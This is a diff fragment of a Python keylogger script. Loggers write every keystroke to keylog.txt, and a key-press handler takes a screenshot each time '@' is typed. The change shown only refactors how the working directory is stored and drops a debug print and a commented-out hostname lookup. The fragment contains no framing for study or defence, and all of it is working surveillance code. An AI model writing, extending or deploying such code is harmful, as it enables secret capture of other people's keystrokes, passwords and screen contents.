@@ -38,22 +38,20 @@ speciallogger = setup_logger('specialcharacterlogger', 'special.txt')
 
 keylogger = setup_logger('keyloggerallstrokes', 'keylog.txt')
 
-
+cwd = os.getcwd()
 
 def on_press(key):
 
 
     global counter 
 
-    print(os.getcwd())
-    # print(socket.gethostbyname(socket.gethostname()))
     if(key == Key.esc):
         quit()
 
     print(str(key))
     if(str(key) == "'@'"):
         myScreenshot = pyautogui.screenshot()
-        myScreenshot.save(r"{0}\screenshot{1}.png".format(os.getcwd(), counter))
+        myScreenshot.save(r"{0}\screenshot{1}.png".format(cwd, counter))
 
         counter+=1
 
